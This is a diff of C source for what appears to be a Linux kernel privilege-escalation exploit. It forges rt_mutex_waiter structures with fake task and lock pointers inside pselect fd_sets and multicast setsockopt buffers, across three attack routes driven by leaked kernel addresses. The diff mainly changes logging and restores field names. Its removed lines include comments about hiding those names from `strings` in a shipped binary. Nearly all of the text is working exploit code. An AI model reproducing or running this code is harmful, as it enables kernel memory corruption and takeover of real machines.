@@ -228,7 +228,7 @@ void do_mcast_fake_lock_route(void) {
   if (!page_base || !fake_lock || !fake_fops) {
     route_last_step = 50;
     route_last_errno = 0;
-    gl_addr_warn("mcast route missing page=%016zx lock=%016zx fops=%016zx\n",
+    pr_warning("mcast route missing page=%016zx lock=%016zx fops=%016zx\n",
                page_base, fake_lock, fake_fops);
     return;
   }
@@ -240,7 +240,6 @@ void do_mcast_fake_lock_route(void) {
     pr_warning("mcast route socket errno=%d\n", errno);
     return;
   }
-  pr_info("mcast route start\n");
 
   int observe = observe_enabled();
 
@@ -258,7 +257,7 @@ void do_mcast_fake_lock_route(void) {
   int post_hold = TCP_POST_GETSOCKOPT_HOLD;
   int route_ok = 0;
 
-  gl_addr_info("mcast route enter observe=%d page=%016zx lock=%016zx "
+  pr_info("mcast route enter observe=%d page=%016zx lock=%016zx "
           "task=%016zx pc=%016zx left=%016zx attempts=%d arm=%d hold=%d\n",
           observe, page_base, fake_lock, fake_task, fake_w0,
           pselect_custom_target, TCP_ROUTE_ATTEMPTS, arm_seq, post_hold);
@@ -278,9 +277,6 @@ void do_mcast_fake_lock_route(void) {
     opt[19] = fake_lock;
     opt[20] = wake_prio;
     errno = 0;
-    if (i == 1 || (i & 7) == 0)
-      pr_info("mcast seq=%d enter calls=%d success=%d\n", i, calls_before,
-              success_before);
     int ret = setsockopt(client_fd, IPPROTO_IP, MCAST_JOIN_SOURCE_GROUP,
                          opt, sizeof(opt));
     int saved_errno = errno;
@@ -338,7 +334,7 @@ void do_tcp_fake_lock_route(void) {
   if (!page_base || !fake_lock || !fake_fops) {
     route_last_step = 40;
     route_last_errno = 0;
-    gl_addr_warn("tcp route missing page=%016zx lock=%016zx fops=%016zx\n",
+    pr_warning("tcp route missing page=%016zx lock=%016zx fops=%016zx\n",
              page_base, fake_lock, fake_fops);
     return;
   }
@@ -347,7 +343,6 @@ void do_tcp_fake_lock_route(void) {
   int server_fd = -1;
   int punch_fd = -1;
   char *map = MAP_FAILED;
-  pr_info("tcp route start\n");
   pthread_t puncher;
   int puncher_started = 0;
   int route_ok = 0;
@@ -402,7 +397,7 @@ void do_tcp_fake_lock_route(void) {
   int arm_seq = TCP_ARM_SEQ;
   int post_hold = TCP_POST_GETSOCKOPT_HOLD;
 
-  gl_addr_info("tcp route enter observe=%d pre=%d page=%016zx fake_lock=%016zx "
+  pr_info("tcp route enter observe=%d pre=%d page=%016zx fake_lock=%016zx "
           "fake_w0=%016zx fake_task=%016zx task=%016zx attempts=%d "
           "arm=%d hold=%d\n",
           observe_enabled(), observe_puncher_ready(), page_base, fake_lock,
@@ -445,14 +440,6 @@ void do_tcp_fake_lock_route(void) {
     uint32_t msg_clen = 0;
     int task_ok = waiter_task != 0;
     int lock_ok = fake_lock != 0;
-    /* Only the gated "obs seq=" line below reads these; keep them defined so
-     * the release build (where that line is compiled out) still sees the
-     * payload as used. */
-    (void)flags;
-    (void)msg_control;
-    (void)msg_clen;
-    (void)task_ok;
-    (void)lock_ok;
     put64(zc, 0x18, addr);
     put32(zc, 0x20, cblen);
     put64(zc, 0x28, waiter_task);
@@ -477,7 +464,7 @@ void do_tcp_fake_lock_route(void) {
     int success = atomic_load(&consumer_success);
     if (calls <= calls_before || success <= success_before) {
       if (observe_enabled()) {
-        gl_addr_info("obs seq=%d ret=%d errno=%d len=%u addr=%016zx cblen=%u "
+        pr_info("obs seq=%d ret=%d errno=%d len=%u addr=%016zx cblen=%u "
                 "flags=%08x msg_control=%016zx msg_clen=%016zx task_ok=%d "
                 "lock_ok=%d\n",
                 i, ret, saved_errno, len, (size_t)addr, cblen, flags,
@@ -610,18 +597,15 @@ static int pselect_waiter_shift(void) {
 
 static void pselect_put_waiter_word(
     fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
-    int waiter_word, uint64_t value) {
+    int waiter_word, uint64_t value, const char *name) {
   int global_word = pselect_waiter_shift() + waiter_word;
   int placed = pselect_put_global_word(
       in, out, ex, words_per_set, global_word, value);
   if (!placed) {
-    /* Reports the word index, not a field name: the names that used to be
-     * passed here ("tree_pc", "pi_left", "wake_prio", ...) spelled out the
-     * rt_mutex_waiter layout and were readable with `strings` on the shipped
-     * binary. */
-    pr_warning("pselect cannot place waiter_word=%d global_word=%d "
+    pr_warning("pselect cannot place %s waiter_word=%d global_word=%d "
                "words_per_set=%d nfds=%d\n",
-               waiter_word, global_word, words_per_set, PSELECT_ROUTE_NFDS);
+               name, waiter_word, global_word, words_per_set,
+               PSELECT_ROUTE_NFDS);
   }
 }
 
@@ -676,6 +660,7 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   struct pselect_waiter_word {
     int word;
     uint64_t value;
+    const char *name;
   };
 
   if (compact) {
@@ -686,42 +671,44 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
     uint64_t relink_pc = fake_right ? fake_right : fake_parent;
     uint64_t relink_left = fake_right ? pselect_custom_target : fake_left;
     struct pselect_waiter_word words[] = {
-      {2, relink_pc},
-      {3, 0},
-      {4, relink_left},
-      {5, relink_pc},
-      {6, 0},
-      {7, relink_left},
-      {8, fake_task},
-      {9, fake_lock},
-      {10, ((uint64_t)FAKE_WAITER_PRIO << 32) | 3},
-      {11, 0},
-      {12, 0},
+      {2, relink_pc, "tree_pc"},
+      {3, 0, "tree_right"},
+      {4, relink_left, "tree_left"},
+      {5, relink_pc, "pi_pc"},
+      {6, 0, "pi_right"},
+      {7, relink_left, "pi_left"},
+      {8, fake_task, "task"},
+      {9, fake_lock, "lock"},
+      {10, ((uint64_t)FAKE_WAITER_PRIO << 32) | 3, "wake_prio"},
+      {11, 0, "deadline"},
+      {12, 0, "ww_ctx"},
     };
     for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
       struct pselect_waiter_word *w = &words[i];
-      pselect_put_waiter_word(in, out, ex, words_per_set, w->word, w->value);
+      pselect_put_waiter_word(
+          in, out, ex, words_per_set, w->word, w->value, w->name);
     }
   } else {
     /* 6.6 rt_mutex_waiter with rb_node tree/pi_tree */
     struct pselect_waiter_word words[] = {
-      {2, 0},
-      {3, 0},
-      {4, 0},
-      {5, 1},
-      {6, 0},
-      {7, 0},
-      {8, 0},
-      {9, 0},
-      {10, 1},
-      {11, 0},
-      {12, fake_task},
-      {13, fake_lock},
-      {14, 3},
+      {2, 0, "tree_pc"},
+      {3, 0, "tree_right"},
+      {4, 0, "tree_left"},
+      {5, 1, "tree_prio"},
+      {6, 0, "tree_deadline"},
+      {7, 0, "pi_parent"},
+      {8, 0, "pi_right"},
+      {9, 0, "pi_left"},
+      {10, 1, "pi_prio"},
+      {11, 0, "pi_deadline"},
+      {12, fake_task, "task"},
+      {13, fake_lock, "lock"},
+      {14, 3, "wake_state"},
     };
     for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
       struct pselect_waiter_word *w = &words[i];
-      pselect_put_waiter_word(in, out, ex, words_per_set, w->word, w->value);
+      pselect_put_waiter_word(
+          in, out, ex, words_per_set, w->word, w->value, w->name);
     }
   }
 }
@@ -730,14 +717,13 @@ void do_pselect_fake_lock_route(void) {
   if (!page_base || !fake_lock || !fake_fops) {
     route_last_step = 30;
     route_last_errno = 0;
-    gl_addr_warn("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
+    pr_warning("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
              page_base, fake_lock, fake_fops);
     return;
   }
 
   struct timespec route_t0;
   clock_gettime(CLOCK_MONOTONIC, &route_t0);
-  pr_info("pselect route start\n");
   int pipefd[2];
   SYSCHK(pipe(pipefd));
 
@@ -790,7 +776,7 @@ void do_pselect_fake_lock_route(void) {
     fd_set out;
     fd_set ex;
     prepare_pselect_fdsets(&in, &out, &ex);
-    gl_addr_info("pselect route setup attempt=%d/%d shift=%d page=%016zx "
+    pr_info("pselect route setup attempt=%d/%d shift=%d page=%016zx "
             "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
             "in0=%016llx in3=%016llx out0=%016llx ex0=%016llx "
             "ex1=%016llx ex2=%016llx ex3=%016llx\n",
